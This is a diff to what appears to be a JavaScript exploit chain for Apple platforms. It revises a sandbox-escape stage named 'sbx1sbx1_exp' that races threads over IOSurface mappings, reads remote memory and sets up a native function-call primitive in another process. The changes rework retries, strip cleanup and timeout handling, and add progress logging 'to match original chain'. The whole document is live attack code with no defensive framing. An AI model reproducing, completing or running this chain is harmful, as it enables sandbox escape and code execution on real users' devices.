@@ -5939,7 +5939,7 @@
     t.lock = wait_lock;
     return t;
   }
-  function sbx1sbx1_exp(size, sync_retry_count = 0) {
+  function sbx1sbx1_exp(size, _retries_left = 3) {
     if (size != SBX1SBX1_EXP_SIZE) {
       LOG("[x] Error: EXP mapping length must match hardcoded size, for now.");
       return undefined;
@@ -5976,38 +5976,13 @@
     let busy_thread = sbx1sbx1_busy_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_fm.fd);
     r = pread(target_fm.fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n);
     assert(r == MAX_TRANSFER_BYTES);
-    function terminate_exp_thread(thread_info, label) {
-      try {
-        if (thread_info && thread_info.thread) {
-          let mach_thread = pthread_mach_thread_np(thread_info.thread);
-          if (mach_thread) thread_terminate(mach_thread);
-        }
-      } catch (e) {
-        LOG(`[!] failed to terminate ${label}: ${e}`);
-      }
-    }
-    function cleanup_sbx1sbx1_exp_attempt(release_target_surface) {
-      terminate_exp_thread(exp_thread, 'exp_thread');
-      terminate_exp_thread(busy_thread, 'busy_thread');
-      try { thread_lock_unlock(race_thread_lock); } catch (e) {}
-      if (release_target_surface && target_surface != 0n) {
-        try { CFRelease(target_surface); } catch (e) {}
-        target_surface = 0n;
-      }
-      try { IOServiceClose(scaler_connection); } catch (e) {}
-      try { destroy_file_mapping(target_fm); } catch (e) {}
-      try { mach_vm_deallocate(mach_task_self(), read_address, read_size); } catch (e) {}
-      try { mach_vm_deallocate(mach_task_self(), source_surface_address, source_surface_size); } catch (e) {}
-      try { CFRelease(source_surface); } catch (e) {}
-    }
     function retry_sbx1sbx1_exp_after_sync_timeout(label) {
-      LOG(`[!] ${label} timed out during sbx1sbx1_exp setup, retry=${sync_retry_count}`);
-      cleanup_sbx1sbx1_exp_attempt(true);
-      if (sync_retry_count >= 3) {
-        LOG("[x] sbx1sbx1_exp sync retry limit reached");
+      if (_retries_left <= 0) {
+        LOG(`[x] sbx1sbx1_exp retry limit reached (${label})`);
         return undefined;
       }
-      return sbx1sbx1_exp(size, sync_retry_count + 1);
+      LOG(`[!] ${label} timed out during sbx1sbx1_exp setup, retries_left=${_retries_left}`);
+      return sbx1sbx1_exp(size, _retries_left - 1);
     }
     let won = false;
     exp_bypass_interval = Date.now();
@@ -6329,31 +6304,23 @@
       }
       let alive = false;
       if (success) {
-        let surface_wait_start = Date.now();
         while (true) {
           surface_address_remote = uread64(surface_address + 0x8n);
           if (surface_address_remote != 0n) {
             break;
           }
-          if (Date.now() - surface_wait_start > 5000) {
-            LOG("[x] Timed out waiting for surface_address_remote (5s)");
-            alive = false;
-            success = false;
-            break;
-          }
           usleep(1n);
         }
-        if (surface_address_remote == 0n) {
-          mach_port_deallocate(mach_task_self(), connection["client_port"]);
-          continue;
-        }
         LOG(`surface_address_remote: ${surface_address_remote.hex()}`);
-        setup_nativefcall_fcall();
-        {
+        LOG("[i] starting nativefcall bootstrap");
+        if (!setup_nativefcall_fcall()) {
+          LOG("[x] nativefcall setup failed, retrying endpoint");
+          services_idx = 0n;
+          success = false;
+        } else {
           LOG("[i] nativefcall setup done...");
           lazy_fcall("usleep", 5n * 1000n);
           mpd_fcall_noreturn(CALLOC, 0x100n, 1n, 0n, 0n, 0n, 0n, 0n, 0n);
-          let fcall_wait_start = Date.now();
           while (true) {
             let interval = Date.now();
             let test_msg = test_msg_create(connection);
@@ -6362,11 +6329,6 @@
             LOG(`msg took: ${interval} ms`);
             if (kr == MACH_SEND_TIMED_OUT) {
               if (mpd_fcall_check_for_return() == false) {
-                if (Date.now() - fcall_wait_start > 5000) {
-                  LOG("[!] timeout waiting for mpd calloc() fcall return");
-                  alive = false;
-                  break;
-                }
                 continue;
               }
               LOG(`[i] calloc() survived !!!`);
@@ -6375,16 +6337,19 @@
             } else {
               LOG(`[!] calloc() crashed ${kr.hex()} !!! Probably wrong malloc_zones guess address !!!`);
               services_idx = 0n;
+              success = false;
               alive = false;
               break;
             }
           }
         }
-
-        //mach_port_deallocate(mach_task_self(), connection["reply_port"]);
-        mach_port_deallocate(mach_task_self(), connection["client_port"]);
+        LOG("[i] skipping reply_port deallocate to match original chain");
+        LOG("[i] deallocating client_port");
+        let client_port_kr = mach_port_deallocate(mach_task_self(), connection["client_port"]);
+        LOG(`[i] client_port deallocate returned ${client_port_kr.hex()}`);
 
         if (alive) {
+          LOG("[i] nativefcall path is alive; leaving service loop");
           break;
         }
         success = false;
@@ -6395,6 +6360,7 @@
       return false;
     }
     LOG("done");
+    LOG("[i] sbx1sbx1 returning success");
     return true;
   }
   function mpd_fcall_check_for_return() {
